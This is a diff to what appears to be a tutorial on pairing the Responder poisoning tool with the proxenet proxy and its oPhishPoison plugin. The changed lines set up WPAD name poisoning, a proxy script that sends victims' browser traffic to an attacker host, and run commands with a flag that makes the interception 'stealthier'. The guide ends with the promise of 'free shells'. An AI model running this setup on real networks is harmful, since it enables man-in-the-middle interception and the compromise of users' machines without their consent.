@@ -40,7 +40,7 @@ FTP = Off
 POP = Off
 SMTP = Off
 IMAP = Off
-HTTP = Off
+HTTP = On
 HTTPS = Off
 DNS = Off
 LDAP = Off
@@ -50,7 +50,7 @@ SessionLog = Responder-Session.log
 PoisonersLog = Poisoners-Session.log
 AnalyzeLog = Analyzer-Session.log
 RespondTo =
-RespondToName =
+RespondToName = WPAD
 DontRespondTo =
 DontRespondToName =
 
@@ -61,7 +61,7 @@ Serve-Html = Off
 HtmlFilename = files/AccessDenied.html
 ExeFilename = files/BindShell.exe
 ExeDownloadName = ProxyClient.exe
-WPADScript = function FindProxyForURL(url, host){ return 'PROXY ISAProxySrv:8008';}
+WPADScript = function FindProxyForURL(url, host){ return 'PROXY 192.168.56.1:8008';} ; change this address to your situation
 HTMLToInject = <h1>pwn</h1>
 
 [HTTPS Server]
@@ -72,7 +72,7 @@ SSLKey = certs/responder.key
 And just run it to forward to our `proxenet` (which will be listening on
 `192.168.56.1:8008` - see next part).
 ```
-sudo python2 Responder.py -v -I vboxnet0 -u 192.168.56.1:8008
+sudo python2 Responder.py -v -I vboxnet0 -w
 ```
 
 `Responder` will now poison all the requests to our `proxenet` process.
@@ -114,10 +114,11 @@ Add the plugin `oPhishPoison.py` to the autoload directory of `proxenet` and
 start it.
 ```
 $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
-$ ./proxenet -b 192.168.56.1 -p 8008
+$ ./proxenet -b 192.168.56.1 -p 8008 -i -N
 ```
 
-Or add the `-N` option to disable the SSL interception and make it stealthier.
+Adding the `-N` option disables the SSL interception and make it stealthier. The
+`-i` option forces `proxenet` to use the Internet Explorer compatibility mode.
 
 
 ## What's next?
@@ -132,3 +133,8 @@ the beauty of it.
    3. Every HTTP request will go through `proxenet` and the response will be
    poisoned with whatever content you setup.
    4. Enjoy the free shells !
+
+
+## Live demo
+
+Click [here](https://vid.me/ntWe) for a live demo.
